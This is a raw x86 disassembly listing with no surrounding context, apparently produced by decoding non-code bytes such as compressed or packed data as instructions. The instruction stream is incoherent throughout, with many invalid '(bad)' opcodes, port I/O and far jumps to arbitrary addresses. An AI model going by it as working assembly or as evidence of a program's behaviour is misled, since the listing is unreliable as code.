  418cfa:	jg     0x418d7b
  418cfc:	xchg   DWORD PTR [eax-0x3c],esi
  418cff:	jmp    0x418cd5
  418d01:	lods   al,BYTE PTR ds:[esi]
  418d02:	stos   DWORD PTR es:[edi],eax
  418d03:	mov    ecx,0x355ae7db
  418d08:	push   edi
  418d09:	cmp    ebp,0x51ffe02e
  418d0f:	dec    esi
  418d10:	cs push ds
  418d12:	ins    DWORD PTR es:[edi],dx
  418d13:	xor    esp,ebx
  418d15:	retf   0xff54
  418d18:	dec    ebp
  418d19:	cmp    BYTE PTR [eax-0x1c],0xcf
  418d1d:	popa   
  418d1e:	and    bh,BYTE PTR [ebx]
  418d20:	stos   DWORD PTR es:[edi],eax
  418d21:	les    ecx,FWORD PTR [ecx-0x1ed0cf29]
  418d27:	ins    DWORD PTR es:[edi],dx
  418d28:	neg    DWORD PTR [esi-0x6c735dc]
  418d2e:	aad    0x45
  418d30:	lea    ebx,[ebx]
  418d32:	jmp    0x6371d57c
  418d37:	jnp    0x418d41
  418d39:	jbe    0x418d4d
  418d3b:	retf   0x97d6
  418d3e:	push   edx
  418d3f:	gs test eax,0x560999e7
  418d45:	fsub   QWORD PTR [edi+0x33]
  418d48:	mov    esp,0x478deb99
  418d4d:	data16 sahf 
  418d4f:	and    ecx,ecx
  418d51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d52:	sub    BYTE PTR [ebp-0x2f],bh
  418d55:	outs   dx,DWORD PTR ds:[esi]
  418d56:	out    0x57,al
  418d58:	cli    
  418d59:	rcr    DWORD PTR [esi],1
  418d5b:	dec    esp
  418d5c:	xor    edi,ebx
  418d5e:	clc    
  418d5f:	pop    esp
  418d60:	(bad)  
  418d61:	call   0xa23b:0x64bd3285
  418d68:	sbb    DWORD PTR [ebx+0x9],esp
  418d6b:	lock adc al,0x72
  418d6e:	int    0x81
  418d70:	or     cl,ch
  418d72:	retf   
  418d73:	mov    al,0x1f
  418d75:	and    BYTE PTR [edi+eax*4],0xde
  418d79:	iret   
  418d7a:	iret   
  418d7b:	ss push es
  418d7d:	add    ecx,DWORD PTR [ebx]
  418d7f:	ret    
  418d80:	lods   al,BYTE PTR ds:[esi]
  418d81:	out    0x8c,eax
  418d83:	push   ss
  418d84:	pop    eax
  418d85:	pop    ebp
  418d86:	mov    ds:0xa27e4286,eax
  418d8b:	inc    esi
  418d8c:	(bad)  
  418d8d:	mov    eax,ds:0x462cc6bf
  418d92:	adc    eax,0x8c6ee096
  418d98:	xor    al,0x66
  418d9a:	sbb    DWORD PTR [edi-0x2f],ebp
  418d9d:	std    
  418d9e:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  418da0:	adc    dh,BYTE PTR [edx+edi*2+0x36]
  418da4:	shl    DWORD PTR [edi-0x4508ff37],cl
  418daa:	mov    esp,0x964d6b78
  418daf:	cmp    DWORD PTR [eax+0xc],edx
  418db2:	push   ebp
  418db3:	(bad)  
  418db4:	dec    eax
  418db5:	push   edi
  418db6:	sbb    edx,esp
  418db8:	pop    esi
  418db9:	pop    ss
  418dba:	fs out 0x68,al
  418dbd:	ss inc edi
  418dbf:	mov    esp,0x686f68af
  418dc4:	xchg   ebp,eax
  418dc5:	xor    ebp,DWORD PTR [edx+0x35]
  418dc8:	and    BYTE PTR [edx],dl
  418dca:	cs jo  0x418e01
  418dcd:	stc    
  418dce:	sub    edi,DWORD PTR [esi-0x423a4b1f]
  418dd4:	xor    cl,al
  418dd6:	lds    esi,FWORD PTR [ebx-0x7a]
  418dd9:	jo     0x418dab
  418ddb:	and    bl,BYTE PTR [eax-0x5e]
  418dde:	sub    eax,0x6ec2e44c
  418de3:	xor    al,BYTE PTR [edx]
  418de5:	cdq    
  418de6:	mov    ebp,0x5ca772c8
  418deb:	addr16 data16 mov al,ds:0x70c1
  418df0:	dec    ebx
  418df1:	jmp    0x330dece7
  418df6:	arpl   WORD PTR [ebx],bx
  418df8:	adc    al,ch
  418dfa:	sbb    esp,ebp
  418dfc:	mov    ds:0xc3089b7,al
  418e01:	retf   
  418e02:	ins    BYTE PTR es:[edi],dx
  418e03:	scas   al,BYTE PTR es:[edi]
  418e04:	add    al,ch
  418e06:	pushf  
  418e07:	push   0xf3cd8d3a
  418e0c:	pop    ecx
  418e0d:	push   ebx
  418e0e:	ficom  WORD PTR [ebp+esi*8+0x4e]
  418e12:	or     cl,BYTE PTR [esi+0x14]
  418e15:	popa   
  418e16:	add    ebx,DWORD PTR [ecx-0x447675cd]
  418e1c:	mov    al,ds:0xd1bc5afe
  418e21:	shl    DWORD PTR [esi+ecx*1-0x271c79dc],1
  418e28:	mov    dl,0x32
  418e2a:	stos   BYTE PTR es:[edi],al
  418e2b:	retf   
  418e2c:	es sub al,0x9
  418e2f:	fwait
  418e30:	xor    BYTE PTR [edx],bh
  418e32:	mov    al,0xa7
  418e34:	mov    esi,0x7a519802
  418e39:	xor    ah,BYTE PTR [ebp+0x4b50f57]
  418e3f:	shl    BYTE PTR [eax+0x1d911b08],cl
  418e45:	mov    al,ds:0x85e71510
  418e4a:	inc    eax
  418e4b:	sbb    bh,BYTE PTR [edx]
  418e4d:	and    esi,DWORD PTR [ecx+0x27]
  418e50:	mov    cl,0x12
  418e52:	or     eax,0x2a81aa6a
  418e57:	repz mov eax,ds:0xe9deda62
  418e5d:	(bad)  
  418e5e:	(bad)  
  418e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e60:	out    dx,al
  418e61:	daa    
  418e62:	mul    BYTE PTR [esi]
  418e64:	sub    DWORD PTR [edi+edx*4-0x434da1e],0xbc66964a
  418e6f:	sbb    eax,0x54676d4a
  418e74:	clc    
  418e75:	les    edx,FWORD PTR [esi-0x58]
  418e78:	jl     0x418e6a
  418e7a:	mov    esp,0x17e2c378
  418e7f:	and    BYTE PTR [esp+ebx*4+0x1dcd2b50],ah
  418e86:	cs leave 
  418e88:	push   eax
  418e89:	mov    edx,0xa96abbf3
  418e8e:	xchg   BYTE PTR [edi-0x7b],bh
  418e91:	pop    ecx
  418e92:	sub    ecx,DWORD PTR [ecx+0x7a]
  418e95:	cmp    eax,DWORD PTR [esi]
  418e97:	fdivp  st(7),st
  418e99:	xchg   esp,eax
  418e9a:	adc    eax,0x36dc6a4a
  418e9f:	(bad)  
  418ea1:	aam    0x6d
  418ea3:	mov    ebp,0xfd820b24
  418ea8:	pop    edx
  418ea9:	xchg   esp,eax
  418eaa:	fisub  DWORD PTR [ebp-0x3d327b28]
  418eb0:	addr16 inc edi
  418eb2:	inc    esp
  418eb3:	jb     0x418eab
  418eb5:	cmp    ch,BYTE PTR [eax+0x16]
  418eb8:	adc    bh,0x19
  418ebb:	lods   al,BYTE PTR ds:[esi]
  418ebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ebd:	(bad)  
  418ebe:	cmc    
  418ebf:	cs (bad) 
  418ec3:	xchg   edi,eax
  418ec4:	stc    
  418ec5:	out    0x3b,al
  418ec7:	popf   
  418ec8:	cwde   
  418ec9:	cmp    BYTE PTR [esi+0x46],ah
  418ecc:	xchg   edi,eax
  418ecd:	cwde   
  418ece:	nop
  418ecf:	sub    al,0x9d
  418ed1:	sub    al,0x6e
  418ed3:	stc    
  418ed4:	ja     0x418e98
  418ed6:	dec    ecx
  418ed7:	fbstp  TBYTE PTR [edx+0x4567ac81]
  418edd:	js     0x418edf
  418edf:	and    eax,0x494d27d6
  418ee4:	out    dx,al
  418ee5:	lahf   
  418ee6:	(bad)  
  418ee7:	sbb    DWORD PTR [esi+0x5d],esi
  418eea:	sbb    dl,BYTE PTR [esi+0x4]
  418eed:	xchg   ebx,ebp
  418eef:	es dec edx
  418ef1:	adc    DWORD PTR [edx-0x2615235a],esp
  418ef7:	adc    al,0xb9
  418ef9:	retf   0x1dfe
  418efc:	aaa    
  418efd:	sub    al,0x46
  418eff:	(bad)  
  418f01:	sbb    DWORD PTR [eax-0x2b],esp
  418f04:	(bad)  
  418f05:	lods   eax,DWORD PTR ds:[esi]
  418f06:	fisub  DWORD PTR [edx+ebx*2]
  418f09:	jmp    0xb7bc55b2
  418f0e:	aad    0xb1
  418f10:	pop    es
  418f11:	sub    ah,cl
  418f13:	adc    ch,BYTE PTR [edi-0x69]
  418f16:	or     eax,0x21b53d8e
  418f1b:	add    BYTE PTR [edi],ah
  418f1d:	add    eax,0xb9e358cd
  418f22:	ins    DWORD PTR es:[edi],dx
  418f23:	jl     0x418f56
  418f25:	xor    BYTE PTR [edi+esi*2+0x28],0x71
  418f2a:	cmp    BYTE PTR [esi-0x3659322f],dh
  418f30:	add    ch,BYTE PTR [eax+0x73]
  418f33:	adc    eax,0x17e0ed6
  418f38:	xchg   ebp,eax
  418f39:	mov    esp,0x25b20e7a
  418f3e:	(bad)  
  418f3f:	sub    ch,BYTE PTR [ebx-0x26]
  418f42:	mov    dh,0x8a
  418f44:	push   esi
  418f45:	and    al,0x47
  418f47:	enter  0xeef2,0xef
  418f4b:	push   ds
  418f4c:	push   eax
  418f4d:	adc    ah,BYTE PTR [eax+0x2f156514]
  418f53:	xor    DWORD PTR [ebx-0x21d0486c],eax
  418f59:	dec    edx
  418f5a:	xor    eax,0xb4ff66e8
  418f5f:	inc    ebp
  418f60:	pop    ds
  418f61:	ja     0x418efa
  418f63:	sbb    DWORD PTR [ecx-0x40],esi
  418f66:	push   es
  418f67:	and    edi,DWORD PTR [ecx+0x3]
  418f6a:	sahf   
  418f6b:	aad    0x75
  418f6d:	call   0x366b1f92
  418f72:	into   
  418f73:	scas   eax,DWORD PTR es:[edi]
  418f74:	dec    ecx
  418f75:	(bad)  
  418f76:	jmp    0x5d65efcb
  418f7b:	mov    eax,ds:0xd1c1856f
  418f80:	lods   eax,DWORD PTR ds:[esi]
  418f81:	pop    ds
  418f82:	ret    0x22e0
  418f85:	stc    
  418f86:	add    BYTE PTR [edi+ecx*2],ah
  418f89:	dec    ecx
  418f8a:	jae    0x418f43
  418f8c:	xor    eax,0x4e9656aa
  418f91:	add    BYTE PTR ds:0xcbb45761,bh
  418f97:	loop   0x418f51
  418f99:	mov    eax,0xc0adb671
  418f9e:	sti    
  418f9f:	pop    es
  418fa0:	fs (bad) 
  418fa2:	repnz or DWORD PTR [edi-0x6650eea4],edx
  418fa9:	jmp    0x418f60
  418fab:	sbb    BYTE PTR [eax-0x68],dh
  418fae:	pop    ecx
  418faf:	jne    0x41901d
  418fb1:	(bad)  
  418fb2:	out    0x38,eax
  418fb4:	sub    DWORD PTR [ebp+0x554887f9],esi
  418fba:	aad    0x61
  418fbc:	pop    ebp
  418fbd:	lds    esp,FWORD PTR [edi]
  418fbf:	mov    BYTE PTR [eax],bh
  418fc1:	adc    al,0xcc
  418fc3:	jmp    0x418fec
  418fc5:	jle    0x418ff9
  418fc7:	xchg   DWORD PTR [eax],ebp
  418fc9:	fnstenv [ebx]
  418fcb:	ret    0xffde
  418fce:	loope  0x418fe1
  418fd0:	push   es
  418fd1:	jne    0x418fe3
  418fd3:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fd5:	nop
  418fd6:	xor    DWORD PTR [edi],0x68d49ad4
  418fdc:	test   eax,ebx
  418fde:	sbb    edi,0xe9152a2b
  418fe4:	cdq    
  418fe5:	cdq    
  418fe6:	pusha  
  418fe7:	or     eax,0xcb2d803e
  418fec:	stos   BYTE PTR es:[edi],al
  418fed:	inc    esp
  418fee:	mov    ah,dl
  418ff0:	push   es
  418ff1:	movd   edx,mm1
  418ff4:	add    ah,BYTE PTR [eax-0x3feab202]
  418ffa:	aam    0x67
  418ffc:	shl    BYTE PTR [ebx+edx*4+0x40a8c760],1
  419003:	inc    esp
  419004:	scas   al,BYTE PTR es:[edi]
  419005:	int3   
  419006:	push   0x654705e0
  41900b:	sbb    DWORD PTR [eax],eax
  41900d:	xchg   edx,eax
  41900e:	ret    0xefd5
  419011:	fsubr  DWORD PTR [ecx+0x39caf01b]
  419017:	daa    
  419018:	xor    al,0x9d
  41901a:	mov    bh,0xd9
  41901c:	mov    edx,0xdf35dfc9
  419021:	aam    0x3b
  419023:	sub    al,0xc9
  419025:	xor    ah,BYTE PTR [ebp+0x285ebbe7]
  41902b:	jle    0x418fb6
  41902d:	icebp  
  41902e:	or     eax,0x78664d12
  419033:	imul   edi,edx,0xffffff84
  419036:	je     0x418fe8
  419038:	jecxz  0x41906b
  41903a:	(bad)  
  41903b:	in     eax,0xfa
  41903d:	xor    bh,BYTE PTR [eax+0x2ff07e7f]
  419043:	jae    0x419013
  419045:	adc    al,0xe2
  419047:	imul   edi,DWORD PTR [esi-0xfb03a77],0xffffffa0
  41904e:	ds in  eax,dx
  419050:	jb     0x419053
  419052:	dec    ebp
  419053:	pop    edi
  419054:	int    0x76
  419056:	xor    eax,0x7f19393a
  41905b:	add    bh,BYTE PTR [ecx-0x1881bbc3]
  419061:	xchg   esi,eax
  419062:	jg     0x4190ca
  419064:	inc    edi
  419065:	push   0x4c569d62
  41906a:	daa    
  41906b:	not    BYTE PTR [edx]
  41906d:	mov    eax,?
  41906f:	les    ebp,FWORD PTR [eax+eiz*8+0x1a0a7ae1]
  419076:	dec    esp
  419077:	fwait
  419078:	rcl    DWORD PTR [edx],1
  41907a:	sub    ebx,DWORD PTR [edi+0x6e]
  41907d:	test   eax,0xfdf7f283
  419082:	lods   al,BYTE PTR ds:[esi]
  419083:	cld    
  419084:	xchg   edi,eax
  419085:	push   ds
  419086:	dec    esp
  419087:	mov    ch,0xdb
  419089:	aaa    
  41908a:	in     al,0x55
  41908c:	cli    
  41908d:	and    cl,cl
  41908f:	mov    ebp,0x286998de
  419094:	sahf   
  419095:	stos   BYTE PTR es:[edi],al
  419096:	outs   dx,DWORD PTR ds:[esi]
  419097:	xchg   edx,eax
  419098:	sti    
  419099:	std    
  41909a:	or     DWORD PTR [edi],ebx
  41909c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41909d:	sub    DWORD PTR ds:0xb3a01add,edi
  4190a3:	int    0xf1
  4190a5:	repnz popa 
  4190a7:	cs cmp dh,bh
  4190aa:	jge    0x419118
  4190ac:	aas    
  4190ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190ae:	test   al,0xab
  4190b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190b1:	cli    
  4190b2:	push   0x26
  4190b4:	out    dx,eax
  4190b5:	ins    DWORD PTR es:[edi],dx
  4190b6:	icebp  
  4190b7:	jl     0x41908b
  4190b9:	imul   edx,DWORD PTR [eax-0x33],0xffffffe9
  4190bd:	lahf   
  4190be:	popf   
  4190bf:	xor    DWORD PTR [edi],esp
  4190c1:	jns    0x4190a4
  4190c3:	sbb    DWORD PTR [ebx],esi
  4190c5:	pop    eax
  4190c6:	xlat   BYTE PTR ds:[ebx]
  4190c7:	call   0xa2e4:0x7642380f
  4190ce:	push   ebp
  4190cf:	and    eax,0x9cdfe89b
  4190d4:	xchg   esp,eax
  4190d5:	out    dx,al
  4190d6:	scas   eax,DWORD PTR es:[edi]
  4190d7:	or     ebp,DWORD PTR [esi]
  4190d9:	and    al,0x3f
  4190db:	xor    ch,BYTE PTR [ebp+0x17]
  4190de:	std    
  4190df:	jg     0x4190c5
  4190e1:	add    ecx,DWORD PTR [ebx]
  4190e3:	sub    edx,ebx
  4190e5:	adc    edx,DWORD PTR [edi+ecx*8]
  4190e8:	sbb    DWORD PTR ds:0xd1b9d7a4,esp
  4190ee:	mov    WORD PTR [ebp-0x19],?
  4190f1:	xchg   ebp,eax
  4190f2:	inc    ebx
  4190f3:	xlat   BYTE PTR ds:[ebx]
  4190f4:	scas   al,BYTE PTR es:[edi]
  4190f5:	cmp    BYTE PTR [edx+ecx*2],dh
  4190f8:	mov    eax,0xd3994923
  4190fd:	or     eax,0x4b10cfcd
  419102:	cmp    ebp,ebx
  419104:	cs pusha 
  419106:	ins    BYTE PTR es:[edi],dx
  419107:	xchg   ecx,eax
  419108:	jmp    0x4190d4
  41910a:	sbb    esi,DWORD PTR [ebx-0x48]
  41910d:	push   0xa
  41910f:	aaa    
  419110:	dec    ecx
  419111:	xor    esi,DWORD PTR [edx+0x44]
  419114:	ffreep st(7)
  419116:	mov    ebx,0xcadb2aa7
  41911b:	xchg   edx,eax
  41911c:	cmp    DWORD PTR [ebx+0x53],edx
  41911f:	lahf   
  419120:	and    eax,0x649fb674
  419125:	jge    0x41917d
  419127:	xor    DWORD PTR [edi+0x32],ecx
  41912a:	sbb    BYTE PTR [edi+0x6b],dh
  41912d:	push   es
  41912e:	xchg   BYTE PTR [esi+0x5f],al
  419131:	cmp    esi,edi
  419133:	mov    cl,0x19
  419135:	sahf   
  419136:	mov    ds:0xf6c2349d,al
  41913b:	inc    BYTE PTR [ebp+0x45]
  41913e:	pop    esi
  41913f:	loop   0x419151
  419141:	jmp    0x4190c7
  419143:	jecxz  0x41918f
  419145:	aad    0xb4
  419147:	or     DWORD PTR [edx],0xb3da5a4d
  41914d:	sub    al,0xe5
  41914f:	test   eax,0x19df8ae
  419154:	xor    BYTE PTR [edx*2-0x225a1781],bh
  41915b:	inc    ebx
  41915c:	pop    esi
  41915d:	adc    BYTE PTR [ebx+0x6],0x62
  419161:	shl    DWORD PTR [edx-0x39],1
  419164:	dec    esi
  419165:	lods   eax,DWORD PTR ds:[esi]
  419166:	fwait
  419167:	clc    
  419168:	pop    ebx
  419169:	xor    eax,0x4a1bafb9
  41916e:	and    ecx,edx
  419170:	mov    ebp,ebp
  419172:	test   BYTE PTR [ebx+0x1],bh
  419175:	(bad)  
  419176:	pop    ss
  419177:	call   0x817f:0x1a002b12
  41917e:	sti    
  41917f:	pop    ss
  419180:	(bad)  
  419181:	retf   0x914a
  419184:	adc    eax,0xa1912701
  419189:	dec    ebp
  41918a:	ficomp DWORD PTR [ebp+0x4244222e]
  419190:	jmp    0x892be86b
  419195:	leave  
  419196:	inc    ebp
  419197:	clc    
  419198:	push   es
  419199:	adc    DWORD PTR [ebp+0x28],edi
  41919c:	xchg   esp,eax
  41919d:	es in  al,0xd8
  4191a0:	cmp    eax,0x2e6efa6d
  4191a5:	sub    DWORD PTR [edx],ecx
  4191a7:	repnz call 0x56e4:0x5bcd83ff
  4191af:	leave  
  4191b0:	sahf   
  4191b1:	and    DWORD PTR ds:0xd0390f3,edx
  4191b7:	test   al,0x0
  4191b9:	sbb    BYTE PTR [edx+0x75531bb3],ah
  4191bf:	pop    ecx
  4191c0:	jecxz  0x419151
  4191c2:	mov    bh,0xbf
  4191c4:	sub    bh,cl
  4191c6:	es or  eax,0x2ebbc3b6
  4191cc:	xor    DWORD PTR [ebp-0x46b285ca],ebp
  4191d2:	icebp  
  4191d3:	pop    edi
  4191d4:	call   0x6daf:0xaf80f6be
  4191db:	inc    esi
  4191dc:	xchg   edi,eax
  4191dd:	mov    al,ds:0xcf06707a
  4191e2:	add    BYTE PTR [esi*1+0x2bc9e868],ch
  4191e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191ea:	add    edx,DWORD PTR [edi+esi*1]
  4191ed:	out    dx,eax
  4191ee:	xlat   BYTE PTR ds:[ebx]
  4191ef:	mov    eax,ds:0xb99229d0
  4191f4:	inc    edx
  4191f5:	ss push edx
  4191f7:	nop
  4191f8:	push   0xffffffd1
  4191fa:	test   DWORD PTR [eax+0xa813737],0xa2624f
  419204:	or     bl,BYTE PTR [esp+edi*1]
  419207:	call   0xe830a23a
  41920c:	ret    
  41920d:	pop    ebp
  41920e:	loope  0x419223
  419210:	bound  ebx,QWORD PTR [edi+0x722f5fc9]
  419216:	push   esi
  419217:	(bad)  
  419218:	xor    BYTE PTR [esi],bh
  41921a:	jo     0x419263
  41921c:	clc    
  41921d:	sub    al,0xe8
  41921f:	into   
  419220:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419221:	sar    WORD PTR [ebx-0xa741b2e],cl
  419228:	ds cmp al,0x81
  41922b:	fldl2t 
  41922d:	mov    al,ds:0x5ae01672
  419232:	frstpm(287 only) 
  419234:	cdq    
  419235:	call   0xdb5b:0x6c01def2
  41923c:	rcl    ch,cl
  41923e:	div    DWORD PTR [edi]
  419240:	mov    edi,0x30f2cfe1
  419245:	stos   BYTE PTR es:[edi],al
  419246:	in     al,dx
  419247:	shl    BYTE PTR [ebx+0x64cc6e3],cl
  41924d:	scas   eax,DWORD PTR es:[edi]
  41924e:	mov    ch,BYTE PTR [edx]
  419250:	xchg   ebx,eax
  419251:	cmp    ah,BYTE PTR [esp+edx*4+0x1183fdaa]
  419258:	cwde   
  419259:	adc    eax,0x90ef62b3
  41925e:	pushf  
  41925f:	je     0x41922e
  419261:	mov    ds:0x378c2987,eax
  419266:	test   DWORD PTR [eax+ebp*8],edx
  419269:	jge    0x419213
  41926b:	dec    esi
  41926c:	and    edi,DWORD PTR [ebx]
  41926e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41926f:	push   eax
  419270:	xor    ecx,ebx
  419272:	cmp    BYTE PTR [edi-0x2c],al
  419275:	ret    
  419276:	popf   
  419277:	out    0x92,al
  419279:	repnz cmc 
  41927b:	repnz add cl,bh
  41927e:	dec    esp
  41927f:	mov    ebp,0x7681b444
  419284:	xor    al,0x9f
  419286:	arpl   WORD PTR [edx-0x2e1b3f65],dx
  41928c:	mov    ecx,0x13202b74
  419291:	add    al,BYTE PTR [esi+0x61]
  419294:	or     BYTE PTR [eax+0x11],ah
  419297:	jae    0x4192c2
  419299:	ret    
  41929a:	addr16 repz fs cld 
  41929e:	test   eax,esi
  4192a0:	xlat   BYTE PTR ds:[ebx]
  4192a1:	shl    DWORD PTR cs:[eax],cl
  4192a4:	js     0x419321
  4192a6:	mov    eax,0x8986c2db
  4192ab:	cmp    ah,cl
  4192ad:	pop    ds
  4192ae:	or     eax,ebx
  4192b0:	adc    ecx,DWORD PTR ds:0xc6bf185c
  4192b6:	adc    esp,DWORD PTR [edx-0x73235586]
  4192bc:	gs leave 
  4192be:	pushf  
  4192bf:	(bad)  
  4192c0:	jae    0x41927f
  4192c2:	arpl   WORD PTR [edx+0x67],ax
  4192c5:	enter  0x94c3,0xeb
  4192c9:	into   
  4192ca:	mov    bx,0xb5ea
  4192ce:	pop    esp
  4192cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192d0:	cmp    ebp,DWORD PTR [eax+ebx*2+0x65]
  4192d4:	mov    ch,0xcb
  4192d6:	dec    eax
  4192d7:	imul   edx,DWORD PTR [eax+0x14],0xe4d67b0e
  4192de:	std    
  4192df:	std    
  4192e0:	(bad)  
  4192e1:	in     eax,0xfe
  4192e3:	idiv   DWORD PTR [ecx+0x27]
  4192e6:	mov    ecx,0xb241f5ef
  4192eb:	jae    0x4192de
  4192ed:	out    dx,eax
  4192ee:	mov    al,0xd0
  4192f0:	in     eax,0x43
  4192f2:	ins    BYTE PTR es:[edi],dx
  4192f3:	pop    edi
  4192f4:	addr16 xchg edx,eax
  4192f6:	push   es
  4192f7:	test   DWORD PTR [eax],esi
  4192f9:	test   DWORD PTR [ebp+0x2f98d891],esp
  4192ff:	test   eax,0xcfadfd1e
  419304:	mov    bl,0x3b
  419306:	xchg   DWORD PTR [ebx+0x2bdeed7a],edx
  41930c:	dec    ecx
  41930d:	scas   eax,DWORD PTR es:[edi]
  41930e:	neg    DWORD PTR [ecx+eax*8-0x1ddcbc8b]
  419315:	mov    BYTE PTR [ecx],bh
  419317:	(bad)  
  419319:	pusha  
  41931a:	rcl    DWORD PTR [ebx+eax*1+0x4074df1d],cl
  419321:	jno    0x4192c3
  419323:	dec    ebp
  419324:	pop    edx
  419325:	mov    dh,0xe2
  419327:	pop    eax
  419328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419329:	std    
  41932a:	jmp    0x419311
  41932c:	pop    es
  41932d:	mov    ebp,0xb06a1fef
  419332:	mov    ah,0xef
  419334:	cmp    esi,esi
  419336:	add    al,0x45
  419338:	adc    DWORD PTR [eax+0x51],ebp
  41933b:	jg     0x419392
  41933d:	mov    ecx,0x791dba73
  419342:	cwde   
  419343:	loopne 0x419336
  419345:	jae    0x4193c5
  419347:	jne    0x419349
  419349:	sub    DWORD PTR [ebp+0x33],ebx
  41934c:	jmp    0x160b:0x68d1e04e
  419353:	dec    esp
  419354:	and    ebp,DWORD PTR [edx-0x71]
  419357:	imul   DWORD PTR [ebx+0x4427f402]
  41935d:	nop
  41935e:	sbb    al,0x61
  419360:	lods   eax,DWORD PTR ds:[esi]
  419361:	xchg   esi,eax
  419362:	call   0xc403:0x4f4ae72b
  419369:	inc    ebp
  41936a:	jae    0x4193bb
  41936c:	cs jg  0x4193d5
  41936f:	daa    
  419370:	push   edi
  419371:	jl     0x4193ca
  419373:	xor    ecx,esp
  419375:	into   
  419376:	lahf   
  419377:	sub    ah,BYTE PTR [ebx+0x23]
  41937a:	test   BYTE PTR [ebx],ah
  41937c:	mov    dl,0x48
  41937e:	in     eax,0x8c
  419380:	or     DWORD PTR [esi+0x5b],ecx
  419383:	imul   ebx,ecx,0xd9ee1968
  419389:	fldenv [edx-0x4d]
  41938c:	outs   dx,DWORD PTR ds:[esi]
  41938d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41938e:	fstp   QWORD PTR [esi-0x3e0c7fb9]
  419394:	aas    
  419395:	or     DWORD PTR [ebx],edx
  419397:	ror    BYTE PTR [ecx],1
  419399:	push   ss
  41939a:	and    ebp,eax
  41939c:	call   0x9cd6c2b0
  4193a1:	aad    0x5f
  4193a3:	fwait
  4193a4:	dec    ebp
  4193a5:	and    eax,0x82349343
  4193aa:	enter  0x1a1a,0x7b
  4193ae:	push   ss
  4193af:	or     edi,edi
  4193b1:	popa   
  4193b2:	aas    
  4193b3:	test   DWORD PTR [ebx+ebx*1],ecx
  4193b6:	add    bh,BYTE PTR [edi-0x2c]
  4193b9:	mov    cl,BYTE PTR [eax-0x2c89d16]
  4193bf:	xlat   BYTE PTR ds:[ebx]
  4193c0:	jne    0x4193fa
  4193c2:	and    al,0xf1
  4193c4:	adc    eax,0x7be5c7e5
  4193c9:	or     edi,esp
  4193cb:	adc    ebx,esi
  4193cd:	into   
  4193ce:	std    
  4193cf:	mov    ebx,0xb887b7ad
  4193d4:	cmp    ecx,DWORD PTR [eax+0x6c]
  4193d7:	inc    esi
  4193d8:	neg    DWORD PTR [ebx]
  4193da:	fsub   DWORD PTR [edx-0x29]
  4193dd:	lds    eax,FWORD PTR [ecx-0x37]
  4193e0:	mul    esi
  4193e2:	inc    esp
  4193e3:	or     DWORD PTR [edx+0x7a8913e],esi
  4193e9:	fstp   TBYTE PTR [ecx]
  4193eb:	pushf  
  4193ec:	and    al,0x69
  4193ee:	and    cl,al
  4193f0:	sub    al,0x73
  4193f2:	shr    DWORD PTR [ecx+0x2127bbf8],0xbb
  4193f9:	push   0x5f
  4193fb:	mov    ah,0xf
  4193fd:	out    0xf,eax
  4193ff:	xor    al,0x1a
  419401:	mov    bl,cl
  419403:	stos   DWORD PTR es:[edi],eax
  419404:	loop   0x419396
  419406:	retf   
  419407:	pushf  
  419408:	cld    
  419409:	add    ch,BYTE PTR [ecx-0x2d4011be]
  41940f:	neg    DWORD PTR [ebx-0xa]
  419412:	xchg   BYTE PTR [esi],ah
  419414:	idiv   DWORD PTR [ecx-0x68a35f82]
  41941a:	lds    esp,FWORD PTR [ebx-0x4f]
  41941d:	mov    ds:0xa64d6442,al
  419422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419423:	outs   dx,DWORD PTR ds:[esi]
  419424:	popf   
  419425:	imul   esi,DWORD PTR [esi],0xffffffe6
  419428:	jbe    0x419468
  41942a:	loop   0x4193f0
  41942c:	sub    edx,DWORD PTR [eax-0x31a885b4]
  419432:	ret    
  419433:	mov    edx,0x8d09c879
  419438:	sub    eax,0x5d548222
  41943d:	(bad)  
  41943e:	adc    eax,DWORD PTR [edx-0x14b01507]
  419444:	ins    DWORD PTR es:[edi],dx
  419445:	xor    ebx,ebx
  419447:	or     ecx,DWORD PTR ds:0x2f0e836a
  41944d:	xchg   ebx,eax
  41944e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41944f:	jbe    0x419424
  419451:	inc    eax
  419452:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419453:	push   0x96d274f0
  419458:	nop
  419459:	fcmovb st,st(5)
  41945b:	sbb    al,0x9a
  41945d:	ja     0x4194d8
  41945f:	xor    esp,DWORD PTR [eax+0x768304b6]
  419465:	cmp    dh,BYTE PTR [edi-0x20c2fb14]
  41946b:	mov    ch,0x2e
  41946d:	imul   ebp,DWORD PTR [eax+0x10c73972],0xffffff82
  419474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419475:	in     eax,dx
  419476:	popa   
  419477:	xchg   ebp,eax
  419478:	mov    al,0xb9
  41947a:	lea    esp,[eax]
  41947c:	stos   DWORD PTR es:[edi],eax
  41947d:	imul   eax,DWORD PTR [edi+0x41a8c691],0xffffffc9
  419484:	add    bl,bl
  419486:	test   ch,bh
  419488:	lea    ebp,[ecx]
  41948a:	(bad)  
  41948b:	xor    BYTE PTR [ecx],dh
  41948d:	imul   eax,DWORD PTR [edi],0xf4a51333
  419493:	arpl   cx,cx
  419495:	or     dh,BYTE PTR [edx-0x4a]
  419498:	jb     0x41945a
  41949a:	adc    eax,0x496f3ec5
  41949f:	sbb    esi,DWORD PTR [ebp-0x6aaf113b]
  4194a5:	add    dl,0x4d
  4194a8:	mov    edi,DWORD PTR [edi+0x4d352bff]
  4194ae:	outs   dx,DWORD PTR ds:[esi]
  4194af:	lahf   
  4194b0:	mov    ebp,0xe304174b
  4194b5:	mov    al,0x9f
